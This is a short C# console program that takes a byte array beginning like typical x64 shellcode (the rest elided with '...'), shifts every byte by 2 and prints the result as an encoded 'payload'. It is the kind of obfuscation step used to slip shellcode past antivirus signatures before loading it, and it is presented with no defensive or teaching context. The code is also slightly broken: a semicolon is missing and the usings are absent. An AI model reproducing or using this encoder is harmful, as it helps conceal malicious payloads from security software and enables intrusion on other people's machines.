namespace Helper
{
	class Program
	{ 
		static void Main(string[] args) 
		{ 
			byte[] buf = new byte[752] { 
				0xfc,0x48,0x83,0xe4,0xf0... 
            }

			byte[] encoded = new byte[buf.Length]; 

			for(int i = 0; i < buf.Length; i++) 
			{ 
				encoded[i] = (byte)(((uint)buf[i] + 2) & 0xFF); 
			}

            StringBuilder hex = new StringBuilder(encoded.Length * 2);
            foreach(byte b in encoded)
            { 
                hex.AppendFormat("0x{0:x2}, ", b);
                
            }
            
            Console.WriteLine("The payload is: " + hex.ToString());
        }
    }
}